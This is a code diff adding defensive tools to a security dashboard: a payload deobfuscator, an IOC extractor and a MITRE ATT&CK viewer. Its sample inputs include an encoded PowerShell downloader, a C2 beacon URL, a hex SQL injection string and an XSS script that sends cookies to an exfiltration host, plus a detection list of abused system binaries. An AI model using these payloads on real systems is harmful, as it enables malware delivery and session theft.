@@ -62,6 +62,7 @@ function switchTab(tabName) {
   const allTabs = [
     "scanner", "attack-matrix", "domain-inspector", "user-vault", "user-stats",
     "admin-soc", "admin-users", "admin-rules", "admin-audit",
+    "payload-dissector", "ioc-extractor", "mitre-matrix",
     "assistant", "quiz", "password-analyzer", "phishing-analyzer"
   ];
 
@@ -98,6 +99,9 @@ function switchTab(tabName) {
     "scanner": "Threat Scanner",
     "attack-matrix": "Live Threat Map",
     "domain-inspector": "Domain Inspector",
+    "payload-dissector": "Payload Dissector",
+    "ioc-extractor": "Threat Intel IOC",
+    "mitre-matrix": "MITRE ATT&CK Matrix",
     "assistant": "AI Security Assistant",
     "quiz": "Cyber Academy",
     "password-analyzer": "Password Sentinel",
@@ -2710,6 +2714,10 @@ function initializeApp() {
   initAttackFeed();
   initCloudDatabase();
   loadAdminScanLogs();
+  initLiveUtcClock();
+  try {
+    selectMitreTactic("initial-access");
+  } catch(e) {}
 
   // Keyboard Shortcut Listener for Sidebar (Ctrl+B / Cmd+B and Escape)
   window.addEventListener("keydown", (e) => {
@@ -4336,3 +4344,547 @@ function downloadDomainReport() {
 }
 
 
+
+
+// ============================================================================
+// ENTERPRISE FORENSIC LAB & MITRE ATT&CK NAVIGATOR MODULES
+// ============================================================================
+
+// --- 1. Live Military UTC Zulu Clock ---
+function initLiveUtcClock() {
+  const clockEl = document.getElementById("liveUtcClock");
+  if (!clockEl) return;
+  
+  function updateClock() {
+    const now = new Date();
+    const iso = now.toISOString(); // e.g. "2026-10-23T14:58:32.123Z"
+    const datePart = iso.substring(0, 10);
+    const timePart = iso.substring(11, 19);
+    clockEl.innerText = `${datePart} ${timePart}Z`;
+  }
+  
+  updateClock();
+  setInterval(updateClock, 1000);
+}
+
+// --- 2. SOC Payload Dissector & Script Deobfuscator ---
+let currentDissectedText = "";
+
+function clearDissectorInput() {
+  const inputEl = document.getElementById("dissector-input");
+  if (inputEl) inputEl.value = "";
+  
+  const badge = document.getElementById("dissector-status-badge");
+  if (badge) {
+    badge.innerText = "AWAITING PAYLOAD";
+    badge.className = "text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-slate-500 border border-slate-800";
+  }
+  
+  const encEl = document.getElementById("dissector-encoding-type");
+  if (encEl) encEl.innerText = "None";
+  
+  const mitreEl = document.getElementById("dissector-mitre-tag");
+  if (mitreEl) mitreEl.innerText = "N/A";
+  
+  const sevEl = document.getElementById("dissector-severity-val");
+  if (sevEl) {
+    sevEl.innerText = "BENIGN / CLEAN";
+    sevEl.className = "text-emerald-400 font-bold";
+  }
+  
+  const iocsList = document.getElementById("dissector-iocs-list");
+  if (iocsList) {
+    iocsList.innerHTML = '<span class="text-slate-600 italic">No artifacts extracted yet.</span>';
+  }
+  
+  const outputEl = document.getElementById("dissector-output");
+  if (outputEl) outputEl.innerText = "Awaiting target payload...";
+  currentDissectedText = "";
+}
+
+function copyDissectedOutput() {
+  if (!currentDissectedText) {
+    alert("No deobfuscated forensic text available to copy.");
+    return;
+  }
+  navigator.clipboard.writeText(currentDissectedText).then(() => {
+    alert("Deobfuscated forensic plaintext copied to clipboard!");
+  }).catch(() => {
+    alert("Clipboard copy failed. Please select text manually.");
+  });
+}
+
+function loadDissectorSample(sampleType) {
+  const inputEl = document.getElementById("dissector-input");
+  if (!inputEl) return;
+  
+  if (sampleType === "powershell") {
+    // Encoded PowerShell command (Bypass execution policy + WebClient DownloadString)
+    inputEl.value = "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AZABvAG0AYQBpAG4ALgBjAG8AbQA6ADgAMAA4ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEMAYQBjAGgAZQBcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAiAA==";
+  } else if (sampleType === "base64_dropper") {
+    // Standard Base64 encoded C2 beacon beaconing to command server
+    inputEl.value = "aHR0cHM6Ly9jMi1hdXRoLW5ldHdvcmsub3JnL2FwaS92Mi9iZWFjb24ucGhwP2hvc3Q9REVTS1RPUC1ERVZJQ0UmYWdlbnQ9djQuMiZzZXNzaW9uPTk0ZjgzYjdhYWE=";
+  } else if (sampleType === "hex_sqli") {
+    // Hex encoded SQL bypass sequence
+    inputEl.value = "0x2720554e494f4e2053454c454354207573657228292c2076657273696f6e28292c20736368656d6128292d2d";
+  } else if (sampleType === "url_xss") {
+    // Multi-layer URL encoded payload with DOM manipulation
+    inputEl.value = "%3Cscript%3Evar%20x%3Dnew%20Image()%3Bx.src%3D%22http%3A%2F%2Fexfil-logging-telemetry.org%2Flog%3Fcookie%3D%22%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E";
+  }
+  
+  runPayloadDissection();
+}
+
+function runPayloadDissection() {
+  const rawInput = (document.getElementById("dissector-input")?.value || "").trim();
+  if (!rawInput) {
+    clearDissectorInput();
+    return;
+  }
+
+  let detectedType = "Plaintext / Unknown";
+  let decodedText = rawInput;
+  let mitreTechnique = "T1059 (Command & Scripting Interpreter)";
+  let severity = "LOW";
+  let extractedArtifacts = [];
+
+  // 1. Check PowerShell EncodedCommand (-enc or UTF-16LE Base64)
+  const psEncMatch = rawInput.match(/(?:-enc|-encodedcommand)\s+([A-Za-z0-9+/=]+)/i);
+  if (psEncMatch) {
+    try {
+      const b64 = psEncMatch[1];
+      const binaryStr = atob(b64);
+      const bytes = new Uint8Array(binaryStr.length);
+      for (let i = 0; i < binaryStr.length; i++) {
+        bytes[i] = binaryStr.charCodeAt(i);
+      }
+      const decoder = new TextDecoder("utf-16le");
+      decodedText = decoder.decode(bytes);
+      detectedType = "PowerShell UTF-16LE (Base64 Encoded)";
+      mitreTechnique = "T1059.001 (PowerShell Stager)";
+      severity = "CRITICAL";
+    } catch(e) {}
+  } else if (/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(rawInput) && rawInput.length >= 16) {
+    // Try Base64 Decode
+    try {
+      const binaryStr = atob(rawInput);
+      // Check if UTF-16LE
+      if (binaryStr.includes("\x00")) {
+        const bytes = new Uint8Array(binaryStr.length);
+        for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
+        const decoder = new TextDecoder("utf-16le");
+        decodedText = decoder.decode(bytes);
+        detectedType = "UTF-16LE Base64 Binary Stream";
+      } else {
+        decodedText = decodeURIComponent(escape(binaryStr));
+        detectedType = "Base64 Standard (RFC 4648)";
+      }
+      mitreTechnique = "T1027 (Obfuscated/Compressed Artifact)";
+      severity = "HIGH";
+    } catch(e) {
+      // Keep raw if atob fails
+    }
+  } else if (/^(?:0x[0-9a-fA-F]+|[0-9a-fA-F]{8,})$/.test(rawInput.replace(/\\x|\s+/g, ""))) {
+    // Hex deobfuscation
+    try {
+      let cleanHex = rawInput.replace(/^0x|\\x|\s+/gi, "");
+      if (cleanHex.length % 2 !== 0) cleanHex = "0" + cleanHex;
+      let result = "";
+      for (let i = 0; i < cleanHex.length; i += 2) {
+        result += String.fromCharCode(parseInt(cleanHex.substr(i, 2), 16));
+      }
+      decodedText = result;
+      detectedType = "Hexadecimal ASCII Byte Stream";
+      mitreTechnique = "T1027 (Binary Hex Obfuscation)";
+      severity = "HIGH";
+    } catch(e) {}
+  } else if (rawInput.includes("%20") || rawInput.includes("%3C") || rawInput.includes("%2F") || rawInput.includes("%3D")) {
+    // URL decoding
+    try {
+      decodedText = decodeURIComponent(rawInput);
+      detectedType = "URL / Percent-Encoding (RFC 3986)";
+      mitreTechnique = "T1059.007 (JavaScript / Web Injection)";
+      severity = "MEDIUM";
+    } catch(e) {}
+  }
+
+  // 2. Defang the decoded output for safe inspection (replace http with hxxp, domain dots with [.])
+  let defangedText = decodedText
+    .replace(/http:\/\//gi, "hxxp://")
+    .replace(/https:\/\//gi, "hxxps://");
+
+  // 3. Scan for extracted IOCs & suspicious commands
+  const ipMatches = decodedText.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
+  ipMatches.forEach(ip => extractedArtifacts.push(`C2 Host IP: ${ip}`));
+
+  const urlMatches = decodedText.match(/https?:\/\/[^\s"'<>]+/gi) || [];
+  urlMatches.forEach(u => extractedArtifacts.push(`Target URL: ${u.replace(/https?:\/\//, "hxxp://")}`));
+
+  const binMatches = decodedText.match(/\b(?:cmd\.exe|powershell\.exe|certutil|bitsadmin|reg\.exe|vssadmin|rundll32|mshta|curl|wget)\b/gi) || [];
+  binMatches.forEach(b => extractedArtifacts.push(`Spawned System Binary: ${b}`));
+
+  const extMatches = decodedText.match(/\b[A-Za-z0-9_-]+\.(?:exe|dll|ps1|vbs|bat|sh|py|bin)\b/gi) || [];
+  extMatches.forEach(e => extractedArtifacts.push(`Referenced Stager File: ${e}`));
+
+  if (extractedArtifacts.length > 0 && severity !== "CRITICAL") {
+    severity = "HIGH";
+  }
+
+  currentDissectedText = defangedText;
+
+  // 4. Update UI Elements
+  const statusBadge = document.getElementById("dissector-status-badge");
+  if (statusBadge) {
+    statusBadge.innerText = "DISSECTION COMPLETE";
+    statusBadge.className = "text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950 text-cyan-400 border border-cyan-500/40 font-bold";
+  }
+
+  const encEl = document.getElementById("dissector-encoding-type");
+  if (encEl) encEl.innerText = detectedType;
+
+  const mitreEl = document.getElementById("dissector-mitre-tag");
+  if (mitreEl) mitreEl.innerText = mitreTechnique;
+
+  const sevEl = document.getElementById("dissector-severity-val");
+  if (sevEl) {
+    sevEl.innerText = severity;
+    if (severity === "CRITICAL") sevEl.className = "text-rose-400 font-bold";
+    else if (severity === "HIGH") sevEl.className = "text-amber-400 font-bold";
+    else sevEl.className = "text-emerald-400 font-bold";
+  }
+
+  const iocsList = document.getElementById("dissector-iocs-list");
+  if (iocsList) {
+    if (extractedArtifacts.length === 0) {
+      iocsList.innerHTML = '<span class="text-slate-600 italic">No specific system binaries or network IOCs detected.</span>';
+    } else {
+      iocsList.innerHTML = extractedArtifacts.map(art => 
+        `<div class="flex items-center gap-1.5 text-slate-300 font-mono text-[11px]"><i class="fa-solid fa-triangle-exclamation text-amber-400 text-[10px]"></i><span>${art}</span></div>`
+      ).join("");
+    }
+  }
+
+  const outputEl = document.getElementById("dissector-output");
+  if (outputEl) {
+    outputEl.innerText = defangedText;
+  }
+}
+
+// --- 3. Threat Intel IOC Extractor & CVE Vulnerability Radar ---
+window.currentExtractedIOCs = {
+  ips: [],
+  hashes: [],
+  domains: [],
+  cves: []
+};
+
+function loadSampleThreatAdvisory() {
+  const inputEl = document.getElementById("ioc-input-text");
+  if (!inputEl) return;
+  
+  inputEl.value = `[CISA THREAT ADVISORY AA24-105A]
+Adversary group APT-29 has been observed targeting perimeter gateways.
+Initial reconnaissance originates from malicious scanning hosts 198.51.100.45 and 203.0.113.195.
+Exploitation leverages CVE-2024-21762 (Out-of-bound write in SSL-VPN) and CVE-2023-38606.
+Once access is gained, subsequent staging infrastructure connects to https://c2-command-mesh.org/auth and update-service-cdn[.]com.
+Associated implant hashes:
+MD5: e4d909c290d0fb1ca068ffaddf22cbd0
+SHA256: 2c54f26e7b7ef9f030f9f688e01102f9b926a61f416962ed8732c30c699f826e
+SHA256: f8b9c71a399f928e1840d8a9c2d1b8c6e5a4f3b2c1d0e9f8a7b6c5d4e3f2a1b0
+Internal RFC1918 traffic recorded towards 10.0.4.15 and 192.168.1.100.`;
+
+  runIOCExtraction();
+}
+
+function runIOCExtraction() {
+  const text = (document.getElementById("ioc-input-text")?.value || "").trim();
+  if (!text) return;
+
+  // 1. IP Addresses (IPv4, with private vs public tagging)
+  const ipRegex = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g;
+  const rawIps = Array.from(new Set(text.match(ipRegex) || []));
+  const ips = rawIps.map(ip => {
+    const isPrivate = /^(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|127\.)/.test(ip);
+    return { ip, isPrivate };
+  });
+
+  // 2. Hashes (MD5: 32 hex, SHA1: 40 hex, SHA256: 64 hex)
+  const sha256Regex = /\b[a-fA-F0-9]{64}\b/g;
+  const sha1Regex = /\b[a-fA-F0-9]{40}\b/g;
+  const md5Regex = /\b[a-fA-F0-9]{32}\b/g;
+
+  const sha256s = Array.from(new Set(text.match(sha256Regex) || []));
+  const sha1s = Array.from(new Set(text.match(sha1Regex) || []));
+  const md5s = Array.from(new Set(text.match(md5Regex) || []));
+  
+  const hashes = [
+    ...sha256s.map(h => ({ hash: h, type: "SHA256" })),
+    ...sha1s.map(h => ({ hash: h, type: "SHA1" })),
+    ...md5s.map(h => ({ hash: h, type: "MD5" }))
+  ];
+
+  // 3. Domains & FQDNs (with defang support)
+  const cleanForDomains = text.replace(/\[\.\]/g, ".").replace(/\[dot\]/gi, ".");
+  const domainRegex = /\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:com|org|net|io|gov|edu|xyz|top|info|ru|cn|biz|me|cc)\b/gi;
+  const rawDomains = Array.from(new Set(cleanForDomains.match(domainRegex) || []));
+  const ignoredWords = ["cisa.gov", "microsoft.com", "example.com"];
+  const domains = rawDomains.filter(d => !ignoredWords.includes(d.toLowerCase()));
+
+  // 4. CVEs
+  const cveRegex = /\bCVE-\d{4}-\d{4,7}\b/gi;
+  const cves = Array.from(new Set(text.match(cveRegex) || [])).map(c => c.toUpperCase());
+
+  window.currentExtractedIOCs = { ips, hashes, domains, cves };
+
+  // Render IP Card
+  const ipCountEl = document.getElementById("ioc-count-ips");
+  const ipListEl = document.getElementById("ioc-list-ips");
+  if (ipCountEl) ipCountEl.innerText = ips.length;
+  if (ipListEl) {
+    if (ips.length === 0) ipListEl.innerHTML = '<span class="text-slate-600 italic">No IPs found.</span>';
+    else {
+      ipListEl.innerHTML = ips.map(item => `
+        <div class="flex items-center justify-between p-1.5 rounded-lg bg-slate-900 border border-slate-800">
+          <span class="text-cyan-300 font-mono">${item.ip}</span>
+          <span class="text-[9px] px-1.5 py-0.5 rounded ${item.isPrivate ? 'bg-slate-800 text-slate-400' : 'bg-rose-950 text-rose-400 font-bold'}">
+            ${item.isPrivate ? 'RFC1918 Private' : 'Public WAN'}
+          </span>
+        </div>
+      `).join("");
+    }
+  }
+
+  // Render Hashes Card
+  const hashCountEl = document.getElementById("ioc-count-hashes");
+  const hashListEl = document.getElementById("ioc-list-hashes");
+  if (hashCountEl) hashCountEl.innerText = hashes.length;
+  if (hashListEl) {
+    if (hashes.length === 0) hashListEl.innerHTML = '<span class="text-slate-600 italic">No hashes found.</span>';
+    else {
+      hashListEl.innerHTML = hashes.map(item => `
+        <div class="p-1.5 rounded-lg bg-slate-900 border border-slate-800">
+          <div class="flex justify-between text-[10px] text-purple-400 font-bold">
+            <span>${item.type}</span>
+          </div>
+          <span class="text-[10px] text-slate-300 font-mono truncate block">${item.hash}</span>
+        </div>
+      `).join("");
+    }
+  }
+
+  // Render Domains Card
+  const domainCountEl = document.getElementById("ioc-count-domains");
+  const domainListEl = document.getElementById("ioc-list-domains");
+  if (domainCountEl) domainCountEl.innerText = domains.length;
+  if (domainListEl) {
+    if (domains.length === 0) domainListEl.innerHTML = '<span class="text-slate-600 italic">No domains found.</span>';
+    else {
+      domainListEl.innerHTML = domains.map(d => `
+        <div class="flex items-center justify-between p-1.5 rounded-lg bg-slate-900 border border-slate-800">
+          <span class="text-amber-300 font-mono truncate max-w-[170px]">${d}</span>
+          <span class="text-[9px] px-1.5 py-0.5 rounded bg-amber-950 text-amber-400 font-bold">Defanged</span>
+        </div>
+      `).join("");
+    }
+  }
+
+  // Render CVEs Card
+  const cveCountEl = document.getElementById("ioc-count-cves");
+  const cveListEl = document.getElementById("ioc-list-cves");
+  if (cveCountEl) cveCountEl.innerText = cves.length;
+  if (cveListEl) {
+    if (cves.length === 0) cveListEl.innerHTML = '<span class="text-slate-600 italic">No CVEs found.</span>';
+    else {
+      cveListEl.innerHTML = cves.map(c => `
+        <div class="flex items-center justify-between p-1.5 rounded-lg bg-slate-900 border border-slate-800">
+          <span class="text-rose-400 font-bold font-mono">${c}</span>
+          <a href="https://nvd.nist.gov/vuln/detail/${c}" target="_blank" rel="noopener" class="text-[10px] text-cyan-400 hover:underline">
+            NVD <i class="fa-solid fa-arrow-up-right-from-square text-[9px]"></i>
+          </a>
+        </div>
+      `).join("");
+    }
+  }
+}
+
+function exportIOCReport(format) {
+  const iocs = window.currentExtractedIOCs;
+  if (!iocs || (iocs.ips.length === 0 && iocs.hashes.length === 0 && iocs.domains.length === 0 && iocs.cves.length === 0)) {
+    alert("Please extract Indicators of Compromise (IOCs) before exporting.");
+    return;
+  }
+
+  if (format === "csv") {
+    let csv = "Indicator_Type,Indicator_Value,Context\n";
+    iocs.ips.forEach(i => csv += `IP_Address,${i.ip},${i.isPrivate ? 'Private' : 'Public'}\n`);
+    iocs.hashes.forEach(h => csv += `File_Hash_${h.type},${h.hash},Threat_Implant\n`);
+    iocs.domains.forEach(d => csv += `Domain_FQDN,${d},C2_Infrastructure\n`);
+    iocs.cves.forEach(c => csv += `CVE_Vulnerability,${c},Exploited_Vector\n`);
+
+    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `cybershield-iocs-${Date.now()}.csv`;
+    a.click();
+    URL.revokeObjectURL(url);
+  } else if (format === "stix") {
+    // Standard STIX 2.1 JSON Bundle Structure
+    const bundle = {
+      type: "bundle",
+      id: "bundle--" + crypto.randomUUID(),
+      spec_version: "2.1",
+      objects: [
+        ...iocs.ips.map(i => ({
+          type: "ipv4-addr",
+          id: "ipv4-addr--" + crypto.randomUUID(),
+          value: i.ip
+        })),
+        ...iocs.domains.map(d => ({
+          type: "domain-name",
+          id: "domain-name--" + crypto.randomUUID(),
+          value: d
+        })),
+        ...iocs.hashes.map(h => ({
+          type: "file",
+          id: "file--" + crypto.randomUUID(),
+          hashes: { [h.type]: h.hash }
+        })),
+        ...iocs.cves.map(c => ({
+          type: "vulnerability",
+          id: "vulnerability--" + crypto.randomUUID(),
+          name: c
+        }))
+      ]
+    };
+
+    const blob = new Blob([JSON.stringify(bundle, null, 2)], { type: "application/json" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `cybershield-stix2.1-${Date.now()}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+}
+
+// --- 4. Interactive MITRE ATT&CK Matrix Navigator ---
+const MITRE_TACTICS_DATA = {
+  "reconnaissance": {
+    id: "TA0043: RECONNAISSANCE",
+    title: "Adversary Phase: Target Information Gathering",
+    desc: "Reconnaissance involves adversaries actively or passively gathering telemetry, identifying network footprints, discovering open ports, and harvesting victim email identities prior to direct engagement.",
+    techniques: [
+      { id: "T1595.001", name: "Port Scanning", desc: "Active scanning of network boundary for exposed TCP/UDP ports.", status: "DEFENDED (WAF + Rate Limiting)" },
+      { id: "T1592", name: "Gather Victim Host Info", desc: "Discovering software versions, OS releases, and server banners.", status: "SHIELDED (Header Obfuscation)" },
+      { id: "T1589", name: "Gather Victim Identity Info", desc: "Scraping corporate credentials and email lists from open repositories.", status: "MONITORED (Threat Radar)" }
+    ]
+  },
+  "initial-access": {
+    id: "TA0001: INITIAL ACCESS",
+    title: "Adversary Phase: Network Perimeter Penetration",
+    desc: "Initial Access consists of entry vectors used to gain an initial foothold. Adversaries utilize spearphishing attachments, deceptive links, and public-facing application vulnerabilities.",
+    techniques: [
+      { id: "T1566.001", name: "Spearphishing Attachment", desc: "Delivery of malicious attachments (PDFs, macros, weaponized archives).", status: "BLOCKED (Static Heuristics)" },
+      { id: "T1566.002", name: "Spearphishing Link", desc: "Deceptive URLs engineered to harvest credentials or deliver payloads.", status: "ACTIVE (Neural Phish Radar)" },
+      { id: "T1190", name: "Exploit Public-Facing App", desc: "Exploitation of web vulnerabilities (SQLi, XSS, Path Traversal, SSRF).", status: "NEUTRALIZED (Adaptive WAF)" }
+    ]
+  },
+  "execution": {
+    id: "TA0002: EXECUTION",
+    title: "Adversary Phase: Malicious Code Execution",
+    desc: "Techniques that result in adversary-controlled code running on a local or remote system. Adversaries often pair execution with evasion to run scripts without user awareness.",
+    techniques: [
+      { id: "T1059.001", name: "PowerShell Stagers", desc: "Executing encoded PowerShell commands to bypass execution policy.", status: "DISSECTED (Payload Sandbox)" },
+      { id: "T1059.003", name: "Windows Command Shell", desc: "Executing cmd.exe batch scripts and one-liners for environment discovery.", status: "ALERTED (Endpoint Agent)" },
+      { id: "T1204.002", name: "Malicious File Execution", desc: "Tricking users into executing weaponized droppers or shortcuts.", status: "VERIFIED (Reputation Engine)" }
+    ]
+  },
+  "persistence": {
+    id: "TA0003: PERSISTENCE",
+    title: "Adversary Phase: Maintaining Access Across Reboots",
+    desc: "Adversaries use persistence techniques to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.",
+    techniques: [
+      { id: "T1547.001", name: "Registry Run Keys", desc: "Adding startup registry keys to re-execute malware on user logon.", status: "AUDITED (Vault Telemetry)" },
+      { id: "T1053.005", name: "Scheduled Tasks / Cron", desc: "Registering recurring tasks to execute payloads on fixed intervals.", status: "MONITORED (Integrity Watch)" },
+      { id: "T1136", name: "Rogue Account Creation", desc: "Creating stealth administrative accounts for persistent entry.", status: "BLOCKED (RBAC Sentinel)" }
+    ]
+  },
+  "defense-evasion": {
+    id: "TA0005: DEFENSE EVASION",
+    title: "Adversary Phase: Avoiding Detection by SOC Defenses",
+    desc: "Techniques that adversaries use to avoid detection throughout their compromise. This includes hiding malicious files, obfuscating code, and disabling security telemetry.",
+    techniques: [
+      { id: "T1027", name: "Obfuscated / Encoded Files", desc: "Employing Base64, Hex, and multibyte encodings to evade signature matching.", status: "DECODED (Forensic Dissector)" },
+      { id: "T1562.001", name: "Disable Security Tools", desc: "Terminating antivirus processes and tampering with syslog agents.", status: "PROTECTED (Tamper Guard)" },
+      { id: "T1070", name: "Indicator Removal on Host", desc: "Clearing event logs, temporary droppers, and bash history.", status: "LOGGED (Immutable Cloud DB)" }
+    ]
+  },
+  "credential-access": {
+    id: "TA0006: CREDENTIAL ACCESS",
+    title: "Adversary Phase: Stealing Passwords & Authentication Tokens",
+    desc: "Techniques for stealing credentials like account names, passwords, and API tokens. Techniques include keylogging, memory scraping, and credential dumping.",
+    techniques: [
+      { id: "T1003", name: "OS Credential Dumping", desc: "Extracting plaintext credentials or hashes from LSASS and shadow copies.", status: "PREVENTED (Credential Shield)" },
+      { id: "T1555", name: "Credentials from Password Stores", desc: "Searching web browser databases and vault caches for saved passwords.", status: "ENCRYPTED (AES-256 Vault)" },
+      { id: "T1110", name: "Brute Force / Credential Stuffing", desc: "Automated authentication attempts using leaked dictionary lists.", status: "THROTTLED (Entropy Radar)" }
+    ]
+  },
+  "command-and-control": {
+    id: "TA0011: COMMAND & CONTROL",
+    title: "Adversary Phase: Communicating with Compromised Systems",
+    desc: "Techniques adversaries use to communicate with systems under their control within a victim network. Adversaries disguise C2 traffic as standard HTTPS and DNS.",
+    techniques: [
+      { id: "T1071.001", name: "Web Protocols (HTTP/S)", desc: "Adversary beacons blend with legitimate corporate web traffic over TLS.", status: "INSPECTED (Domain Forensics)" },
+      { id: "T1573", name: "Encrypted C2 Channel", desc: "Employing custom or standard encryption to conceal C2 instructions.", status: "ANALYZED (Shannon Entropy)" },
+      { id: "T1090", name: "Proxy & Tunneling", desc: "Routing adversary traffic through multi-hop proxies to evade IP attribution.", status: "RESOLVED (RFC 8484 DoH)" }
+    ]
+  }
+};
+
+function selectMitreTactic(tacticKey) {
+  const data = MITRE_TACTICS_DATA[tacticKey];
+  if (!data) return;
+
+  // 1. Highlight active tactic tab button
+  Object.keys(MITRE_TACTICS_DATA).forEach(key => {
+    const btn = document.getElementById(`mitre-tab-${key}`);
+    if (btn) {
+      if (key === tacticKey) {
+        btn.className = "mitre-tactic-btn active p-3 rounded-xl bg-amber-950/40 border border-amber-500/50 text-left transition";
+        const idDiv = btn.querySelector("div:first-child");
+        if (idDiv) idDiv.className = "text-[10px] text-amber-400 font-bold";
+      } else {
+        btn.className = "mitre-tactic-btn p-3 rounded-xl bg-slate-900 border border-slate-800 text-left hover:border-amber-400/50 transition";
+        const idDiv = btn.querySelector("div:first-child");
+        if (idDiv) idDiv.className = "text-[10px] text-slate-500";
+      }
+    }
+  });
+
+  // 2. Update Header Info
+  const idEl = document.getElementById("mitre-active-id");
+  const titleEl = document.getElementById("mitre-active-title");
+  const descEl = document.getElementById("mitre-active-desc");
+
+  if (idEl) idEl.innerText = data.id;
+  if (titleEl) titleEl.innerText = data.title;
+  if (descEl) descEl.innerText = data.desc;
+
+  // 3. Render Techniques Grid
+  const container = document.getElementById("mitre-techniques-container");
+  if (container) {
+    container.innerHTML = data.techniques.map(tech => `
+      <div class="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-2 hover:border-amber-500/40 transition">
+        <div class="flex items-center justify-between">
+          <span class="text-xs font-mono font-bold text-amber-400">${tech.id}</span>
+          <span class="text-[9px] font-mono px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold">
+            ${tech.status}
+          </span>
+        </div>
+        <h4 class="text-sm font-bold text-white">${tech.name}</h4>
+        <p class="text-[11px] font-mono text-slate-400 leading-relaxed">${tech.desc}</p>
+      </div>
+    `).join("");
+  }
+}
